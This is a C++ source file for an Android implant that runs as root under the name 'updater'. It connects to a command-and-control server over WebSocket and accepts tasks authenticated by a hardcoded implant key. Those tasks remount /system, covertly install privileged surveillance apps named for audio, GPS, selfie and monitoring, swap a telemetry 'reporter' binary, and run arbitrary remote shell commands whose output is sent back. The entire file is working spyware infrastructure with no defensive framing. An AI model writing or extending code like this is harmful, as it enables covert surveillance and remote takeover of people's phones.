#include "json_escape_utils.h"

#include <ixwebsocket/IXNetSystem.h>
#include <ixwebsocket/IXWebSocket.h>

#include <atomic>
#include <chrono>
#include <cstring>
#include <ctime>
#include <fstream>
#include <iostream>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

#include <fcntl.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/system_properties.h>
#include <sys/wait.h>
#include <unistd.h>

// Configuration.
static constexpr const char* IMPLANT_KEY_FILE   = "/data/local/tmp/implant.key";
static constexpr const char* IMPLANT_KEY_DEFAULT = "DeltaForce2027";
static constexpr const char* C2_URL_FILE         = "/data/local/tmp/c2_url.txt";
static constexpr const char* C2_TLS_PIN_FILE     = "/data/local/tmp/c2_tls_pin.pem";
static constexpr const char* LOG_PATH            = "/data/local/tmp/updater.log";
static constexpr const char* OTA_DIR             = "/data/local/tmp/ota";
static constexpr const char* REPORTER_PATH       = "/system/bin/reporter";
static constexpr const char* REPORTER_STAGING    = "/data/local/tmp/ota/_reporter/reporter";

struct AppTarget {
    const char* component;
    const char* package;
    const char* apk_name;
};

static const AppTarget APP_TARGETS[] = {
    {"StealthAlert",   "com.stealthalert",   "com.stealthalert.apk"},
    {"StealthAudio",   "com.stealthaudio",   "com.stealthaudio.apk"},
    {"StealthGps",     "com.stealthgps",     "com.stealthgps.apk"},
    {"StealthMonitor", "com.stealthmonitor", "com.stealthmonitor.apk"},
    {"StealthSelfie",  "com.stealthselfie",  "com.stealthselfie.apk"},
};

// Shared state.
static std::string              g_device_id;
static std::string              g_ws_url;
static std::string              g_implant_key;
static std::string              g_last_result;
static std::mutex               g_log_mutex;
static std::mutex               g_task_mutex;
static std::mutex               g_result_mutex;
static std::vector<std::string> g_task_queue;
static std::atomic<bool>        g_shutdown{false};

ix::WebSocket g_webSocket;

// Read the runtime implant key from disk.
static std::string resolve_implant_key() {
    std::ifstream f(IMPLANT_KEY_FILE);
    if (f.is_open()) {
        std::string key;
        if (std::getline(f, key) && !key.empty()) {

            if (!key.empty() && key.back() == '\r') key.pop_back();
            if (!key.empty()) return key;
        }
    }
    return IMPLANT_KEY_DEFAULT;
}

// Compare keys without leaking timing differences.
static bool constant_time_equals(const std::string& a, const std::string& b) {
    if (a.size() != b.size()) return false;
    volatile unsigned char diff = 0;
    for (size_t i = 0; i < a.size(); ++i)
        diff |= static_cast<unsigned char>(a[i]) ^ static_cast<unsigned char>(b[i]);
    return diff == 0;
}

// Append a line to stdout and the updater log.
static void log_line(const std::string& msg) {
    const auto now = std::chrono::system_clock::now();
    std::time_t t = std::chrono::system_clock::to_time_t(now);
    char ts[32];
    std::strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", std::localtime(&t));
    std::string line = std::string(ts) + " [updater] " + msg + "\n";
    std::lock_guard<std::mutex> lock(g_log_mutex);
    std::cout << line;
    int fd = open(LOG_PATH, O_WRONLY | O_CREAT | O_APPEND, 0666);
    if (fd >= 0) {
        write(fd, line.c_str(), line.size());
        close(fd);
    }
}

static bool run_shell(const std::string& cmd) {
// Copy through a staging path, then rename into place.
    log_line("exec: " + cmd);
    int ret = system(cmd.c_str());
    return ret == 0 || (WIFEXITED(ret) && WEXITSTATUS(ret) == 0);
}

static bool remount_system_rw() {
    return run_shell("mount -o rw,remount /system") ||
           run_shell("mount -o rw,remount /");
}

static void remount_system_ro() {
    run_shell("mount -o ro,remount /system 2>/dev/null || true");
}

static bool file_exists(const std::string& path) {
    return access(path.c_str(), F_OK) == 0;
}

static bool atomic_copy_file(const std::string& dest, const std::string& src, mode_t mode) {
    if (!file_exists(src)) {
        std::lock_guard<std::mutex> lk(g_result_mutex);
        g_last_result = "Source missing: " + src;
        log_line(g_last_result);
        return false;
    }
    std::string tmp = dest + ".tmp";
    if (!run_shell("cp \"" + src + "\" \"" + tmp + "\"")) {
        std::lock_guard<std::mutex> lk(g_result_mutex);
        g_last_result = "cp failed for " + src;
        return false;
    }
    std::string modeStr = (mode == 0755) ? "755" : "644";
    run_shell("chmod " + modeStr + " \"" + tmp + "\"");
    run_shell("chown 0.0 \"" + tmp + "\"");
    if (rename(tmp.c_str(), dest.c_str()) != 0) {
        std::lock_guard<std::mutex> lk(g_result_mutex);
        g_last_result = "rename failed for " + dest;
        unlink(tmp.c_str());
        return false;
    }
    sync();
    return true;
}

static bool atomic_copy_to(const std::string& dest, const std::string& src) {
    return atomic_copy_file(dest, src, 0755);
}
static bool atomic_copy_apk(const std::string& dest, const std::string& src) {
    return atomic_copy_file(dest, src, 0644);
}

// Map an inbound component or package name to a known app target.
static const AppTarget* find_app_target(const std::string& component, const std::string& package) {
    for (const auto& t : APP_TARGETS) {
        if (!component.empty() && component == t.component) return &t;
        if (!package.empty() && package == t.package) return &t;
    }
    return nullptr;
}

// Replace one app directory atomically.
static bool sync_app_directory(const AppTarget& target) {
    std::string staging = std::string(OTA_DIR) + "/" + target.package;
    std::string dest = "/system/priv-app/" + std::string(target.package);
    std::string tmp = dest + ".ota_tmp";
    std::string apk_staging = staging + "/" + target.apk_name;

    if (!file_exists(staging)) {
        std::lock_guard<std::mutex> lk(g_result_mutex);
        g_last_result = "Staging dir missing: " + staging;
        log_line(g_last_result);
        return false;
    }
    if (!file_exists(apk_staging)) {
        std::lock_guard<std::mutex> lk(g_result_mutex);
        g_last_result = "APK missing in staging: " + apk_staging;
        log_line(g_last_result);
        return false;
    }

    run_shell("rm -rf \"" + tmp + "\"");
    run_shell("mkdir -p \"" + tmp + "\"");
    if (!run_shell("cp -a \"" + staging + "/.\" \"" + tmp + "/\"")) {
        std::lock_guard<std::mutex> lk(g_result_mutex);
        g_last_result = "Failed to copy staging into " + tmp;
        return false;
    }
    run_shell("chmod 755 \"" + tmp + "\"");
    run_shell("chmod 644 \"" + tmp + "/" + std::string(target.apk_name) + "\"");
    run_shell("chown -R 0.0 \"" + tmp + "\"");
    run_shell("rm -rf \"" + dest + "\"");
    if (!run_shell("mv \"" + tmp + "\" \"" + dest + "\"")) {
        std::lock_guard<std::mutex> lk(g_result_mutex);
        g_last_result = "Failed to move " + tmp + " to " + dest;
        return false;
    }
    run_shell("restorecon -R \"" + dest + "\"");
    sync();
    std::lock_guard<std::mutex> lk(g_result_mutex);
    g_last_result = std::string("Installed app dir ") + target.component + " → " + dest;
    log_line(g_last_result);
    return true;
}

// Update reporter and restart the service.
static bool update_reporter_binary(const std::string& source) {
    std::string src = source.empty() ? REPORTER_STAGING : source;
    if (!remount_system_rw()) {
        std::lock_guard<std::mutex> lk(g_result_mutex);
        g_last_result = "Failed to remount /system";
        return false;
    }
    if (!atomic_copy_to(REPORTER_PATH, src)) {
        remount_system_ro();
        return false;
    }

    run_shell("pkill -9 reporter 2>/dev/null || true");
    for (int i = 0; i < 10; ++i) {
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        if (system("pidof reporter > /dev/null 2>&1") != 0) break;
    }
    run_shell("start system_telemetry_service");
    remount_system_ro();
    std::lock_guard<std::mutex> lk(g_result_mutex);
    g_last_result = "Reporter updated from " + src + " and service restarted";
    log_line(g_last_result);
    return true;
}

// Handle one inbound updater task.
static bool update_one_app_dir(const std::string& component, const std::string& package) {
    const AppTarget* target = find_app_target(component, package);
    if (!target) {
        std::lock_guard<std::mutex> lk(g_result_mutex);
        g_last_result = "Unknown app component: " + component + " / " + package;
        return false;
    }
    if (!remount_system_rw()) {
        std::lock_guard<std::mutex> lk(g_result_mutex);
        g_last_result = "Failed to remount /system";
        return false;
    }
    bool ok = sync_app_directory(*target);
    remount_system_ro();
    return ok;
}

static bool update_one_apk(const std::string& component, const std::string& source) {
    (void)source;
    return update_one_app_dir(component, "");
}

static bool update_all_staged() {
    if (!remount_system_rw()) {
        std::lock_guard<std::mutex> lk(g_result_mutex);
        g_last_result = "Failed to remount /system";
        return false;
    }
    int ok = 0;
    int fail = 0;
    if (file_exists(REPORTER_STAGING)) {
        if (update_reporter_binary(REPORTER_STAGING)) ok++;
        else fail++;
    }
    for (const auto& t : APP_TARGETS) {
        std::string staging = std::string(OTA_DIR) + "/" + t.package;
        std::string apk = staging + "/" + t.apk_name;
        if (!file_exists(apk)) continue;
        if (sync_app_directory(t)) ok++;
        else fail++;
    }
    sync();
    remount_system_ro();
    std::lock_guard<std::mutex> lk(g_result_mutex);
    g_last_result = "update_all finished: " + std::to_string(ok) + " ok, " + std::to_string(fail) + " failed";
    log_line(g_last_result);
    return fail == 0;
}

static std::string get_json_val(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\"";
    size_t pos = json.find(needle);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos);
    if (pos == std::string::npos) return "";
    pos++;
    while (pos < json.size() && (json[pos] == ' ' || json[pos] == '\t')) pos++;
    if (pos >= json.size()) return "";
    if (json[pos] == '"') {
        size_t end = json.find('"', pos + 1);
        if (end == std::string::npos) return "";
        return json.substr(pos + 1, end - pos - 1);
    }
    size_t end = pos;
    while (end < json.size() && json[end] != ',' && json[end] != '}' && json[end] != ']') end++;
    std::string val = json.substr(pos, end - pos);
    while (!val.empty() && (val.back() == ' ' || val.back() == '\n')) val.pop_back();
    return val;
}

// Reject tasks that do not match the runtime implant key.
static bool validate_inbound_task(const std::string& json) {

    if (!constant_time_equals(get_json_val(json, "implant_key"), g_implant_key)) return false;
    return !get_json_val(json, "task").empty();
}

// Send the current updater status to the server.
static void send_heartbeat() {

    std::string result_snapshot;
    {
        std::lock_guard<std::mutex> lk(g_result_mutex);
        result_snapshot.swap(g_last_result);
    }
    std::string json;
    json.reserve(256 + result_snapshot.size() + json_escape_extra_bytes(result_snapshot));
    json += "{\"implant_key\":\"";
    json += json_escape(g_implant_key);
    json += "\",\"device_id\":\"";
    json += json_escape(g_device_id);
    json += "\",\"updater_heartbeat\":1";
    if (!result_snapshot.empty()) {
        json += ",\"updater_result\":\"";
        json += json_escape(result_snapshot);
        json += "\"";
    }
    json += "}";
    try {
        g_webSocket.sendText(json);
    } catch (...) {}
}

// Execute one queued task payload.
static void process_task(const std::string& json) {
    std::string task = get_json_val(json, "task");
    log_line("Task received: " + task);

    if (task == "updater_stop" || task == "stop") {
        std::lock_guard<std::mutex> lk(g_result_mutex);
        g_last_result = "Updater stopping by remote command";
        g_shutdown.store(true);
        return;
    }
    if (task == "updater_update_reporter" || task == "update_reporter") {
        std::string src = get_json_val(json, "source");
        update_reporter_binary(src);
        return;
    }
    if (task == "updater_update_apk" || task == "updater_update_app_dir") {
        update_one_app_dir(get_json_val(json, "component"), get_json_val(json, "package"));
        return;
    }
    if (task == "updater_update_all") {
        update_all_staged();
        return;
    }
    if (task == "updater_shell" || task == "shell") {
        std::string cmd = get_json_val(json, "command");
        if (cmd.empty()) cmd = get_json_val(json, "cmd");
        if (cmd.empty()) {
            std::lock_guard<std::mutex> lk(g_result_mutex);
            g_last_result = "updater_shell: empty command";
            return;
        }

        int fd = open("/data/local/tmp/updater_cmd.out", O_WRONLY | O_CREAT | O_TRUNC, 0600);
        if (fd >= 0) close(fd);
        std::string wrapped = cmd + " > /data/local/tmp/updater_cmd.out 2>&1";
        bool ok = run_shell(wrapped);

        chmod("/data/local/tmp/updater_cmd.out", 0600);
        std::ifstream out("/data/local/tmp/updater_cmd.out");
        std::string output;
        if (out.is_open()) {
            std::string line;
            while (std::getline(out, line)) output += line + "\n";
        }
        std::lock_guard<std::mutex> lk(g_result_mutex);
        g_last_result = ok ? output : ("shell failed: " + output);
        if (g_last_result.empty()) g_last_result = ok ? "[no output]" : "[shell failed]";
        return;
    }
    std::lock_guard<std::mutex> lk(g_result_mutex);
    g_last_result = "Unknown updater task: " + task;
    log_line(g_last_result);
}

// Drain the task queue before the next heartbeat cycle.
static void drain_tasks() {
    std::vector<std::string> batch;
    {
        std::lock_guard<std::mutex> lock(g_task_mutex);
        batch.swap(g_task_queue);
    }
    for (const auto& t : batch) {
        process_task(t);
        if (g_shutdown.load()) break;
    }
}

// Resolve the device serial or fall back to "unknown".
static std::string get_serialno() {
    char value[PROP_VALUE_MAX] = {};
    if (__system_property_get("ro.serialno", value) > 0 && value[0]) {
        return std::string(value);
    }
    return "unknown";
}

// Parse command-line options.
static void parse_args(int argc, char* argv[]) {
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--server-url" && i + 1 < argc) {
            g_ws_url = argv[++i];
        } else if (arg == "--device-id" && i + 1 < argc) {
            g_device_id = argv[++i];
        }
    }
}

// Configure the WebSocket connection and message handlers.
static void init_ws() {
    ix::initNetSystem();
    g_webSocket.setUrl(g_ws_url);
    g_webSocket.setPingInterval(45);
    g_webSocket.enableAutomaticReconnection();

    ix::SocketTLSOptions tls;
    if (access(C2_TLS_PIN_FILE, F_OK) == 0) {
        tls.caFile = C2_TLS_PIN_FILE;
        tls.disable_hostname_validation = false;
        log_line("TLS: using pinned cert");
    } else {

        tls.caFile = "SYSTEM";
        tls.disable_hostname_validation = false;
        log_line("TLS: using system CA bundle");
    }
    g_webSocket.setTLSOptions(tls);

    g_webSocket.setOnMessageCallback([](const ix::WebSocketMessagePtr& msg) {
        if (msg->type == ix::WebSocketMessageType::Message) {
            if (!validate_inbound_task(msg->str)) {
                log_line("Rejected inbound task (bad implant_key or missing task)");
                return;
            }
            std::lock_guard<std::mutex> lock(g_task_mutex);
            g_task_queue.push_back(msg->str);
        } else if (msg->type == ix::WebSocketMessageType::Open) {
            log_line("WS connected");
            send_heartbeat();
        } else if (msg->type == ix::WebSocketMessageType::Error) {
            log_line("WS error: " + msg->errorInfo.reason);
        }
    });
    g_webSocket.start();
}

int main(int argc, char* argv[]) {
    if (getuid() != 0) {
        std::cerr << "Updater requires root." << std::endl;
        return 1;
    }

    signal(SIGPIPE, SIG_IGN);

    parse_args(argc, argv);

    g_implant_key = resolve_implant_key();
    log_line("Implant key source: " +
             std::string(access(IMPLANT_KEY_FILE, F_OK) == 0 ? "file" : "default"));

    if (g_device_id.empty()) {
        std::string serial = get_serialno();
        if (serial == "unknown" || serial.empty()) {
            std::ifstream uuid_f("/proc/sys/kernel/random/uuid");
            if (uuid_f.is_open()) std::getline(uuid_f, serial);
            if (serial.empty()) serial = "unknown";
        }
        g_device_id = "updater_" + serial;
    }
    if (g_ws_url.empty()) {
        std::ifstream url_file(C2_URL_FILE);
        if (url_file.is_open()) {
            std::getline(url_file, g_ws_url);
        }
    }
    if (g_ws_url.empty()) {
        g_ws_url = "ws://127.0.0.1:8000/ws";
    }

    log_line("Starting updater device_id=" + g_device_id + " url=" + g_ws_url);
    run_shell("mkdir -p " + std::string(OTA_DIR));

    init_ws();

    auto last_hb = std::chrono::steady_clock::now();
    while (!g_shutdown.load()) {
        drain_tasks();
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - last_hb).count() >= 30) {
            send_heartbeat();
            last_hb = now;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }

    log_line("Updater shutting down");
    g_webSocket.stop();
    ix::uninitNetSystem();
    return 0;
}
